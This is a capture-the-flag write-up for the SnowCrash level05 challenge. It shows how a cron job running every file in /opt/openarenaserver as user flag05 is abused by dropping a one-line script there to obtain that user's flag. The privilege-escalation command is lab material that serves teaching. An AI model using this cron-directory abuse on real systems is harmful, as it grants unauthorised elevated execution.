When login to level05, we get a new system mail.

Opening it reveal a crontab scheduled every 2 minutes 
that runs usr/sbin/openareaserver script with flag05 perm:

cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05


Opening the /usr/s/bin/openarenaserver script we get :

cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

Looking at /opt/openserver is an empty directory.
But if we understand that script, it loops every two minute on everyfile of the directory openarenaserver
Then limit the amount of time execution to 5 seconds, check and execute (bash -x) the file if exists and then
remove it.

So by just creating a simple file, 

echo "getflag > /tmp/flag" > /opt/openarenaserver/test ; chmod +x /opt/openarenaserver/test

After approximatively 2 minutes the script get executed, our file in /opt/openarenaserver is
deleted and we have a new file in /tmp/flag containing our flag !

level05@SnowCrash:~$ cat /tmp/flag
